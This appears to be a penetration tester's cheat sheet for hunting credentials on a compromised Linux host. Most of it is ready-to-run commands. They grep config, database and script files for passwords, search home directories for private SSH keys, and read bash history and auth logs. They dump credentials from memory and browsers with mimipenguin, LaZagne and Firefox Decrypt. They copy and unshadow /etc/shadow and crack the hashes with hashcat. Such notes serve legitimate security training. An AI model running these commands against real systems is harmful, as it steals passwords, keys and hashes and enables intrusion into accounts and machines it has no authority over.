

                    / /  /   /  Linux



        //Files

    --Configuration Files

    .config  .conf  .cnf

    /$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done



    --Credentials in Configuration Files

    /$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done


            //Databases

    
    /$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done


            //Notes

    /$ find /home/* -type f -name "*.txt" -o ! -name "*.*"


            //Scripts

    /$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done


            ///Cronjobs

    /$ cat /etc/crontab 

    /$ ls -la /etc/cron.*/


            //SSH Keys

    /$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

    /$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"


            ///Bash History


    /$ tail -n5 /home/*/.bash*



            //Logs

            Log File 	                   Description
        /var/log/messages 	    Generic system activity logs.
        /var/log/syslog 	    Generic system activity logs.
        /var/log/auth.log   	(Debian) All authentication related logs.
        /var/log/secure 	    (RedHat/CentOS) All authentication related logs.
        /var/log/boot.log   	Booting information.
        /var/log/dmesg      	Hardware and drivers related information and logs.
        /var/log/kern.log 	    Kernel related warnings, errors and logs.
        /var/log/faillog 	    Failed login attempts.
        /var/log/cron 	        Information related to cron jobs.
        /var/log/mail.log 	    All mail server related logs.
        /var/log/httpd      	All Apache related logs.
        /var/log/mysqld.log 	All MySQL server related logs.



    /$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done



                ///Memory and Cache

    Many applications and processes work with credentials needed for authentication 
    and store them either in memory or in files so that they can be reused. For example, 
    it may be the system-required credentials for the logged-in users. Another example is
    the credentials stored in the browsers, which can also be read. In order to retrieve
    this type of information from Linux distributions, there is a tool called mimipenguin that
    makes the whole process easier. However, this tool requires administrator/root permissions.

    (https://github.com/huntergregal/mimipenguin)

    /$ sudo python3 mimipenguin.py


    An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in 
    Windows section is LaZagne. This tool allows us to access far more resources and extract the 
    credentials.

   / $ sudo python2.7 laZagne.py all


            ///Browsers


    --Firefox Stored Credentials

    /$ ls -l .mozilla/firefox/ | grep default 

    /$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

    The tool Firefox Decrypt is excellent for decrypting these credentials, and is updated regularly.
    It requires Python 3.9 to run the latest version. 

    /$ python3.9 firefox_decrypt.py


    --Browsers - LaZagne

    /$ python3 laZagne.py browsers





                    /////Passwd, Shadow & Opasswd

    Linux-based distributions can use many different authentication mechanisms. One of the most 
    commonly used and standard mechanisms is Pluggable Authentication Modules (PAM). The modules 
    used for this are called pam_unix.so or pam_unix2.so and are located in 
    /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user 
    information, authentication, sessions, current passwords, and old passwords. For example, if we
    want to change the password of our account on the Linux system with passwd, PAM is called, which
    takes the appropriate precautions and stores and handles the information accordingly.




    The encrypted password also has a particular format by which we can also find out some information:

    $<type>$<salt>$<hashed>

    Algorithm Types

    $1$ – MD5
    $2a$ – Blowfish
    $2y$ – Eksblowfish
    $5$ – SHA-256
    $6$ – SHA-512


    By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions.




    The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords 
    are stored is the /etc/security/opasswd. Administrator/root permissions are also required to 
    read the file if the permissions for this file have not been changed manually.



    /Unshadow

    $ sudo cp /etc/passwd /tmp/passwd.bak 
    $ sudo cp /etc/shadow /tmp/shadow.bak 
    $ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

    $ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

    /Hashcat - Cracking MD5 Hashes

    $ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

    




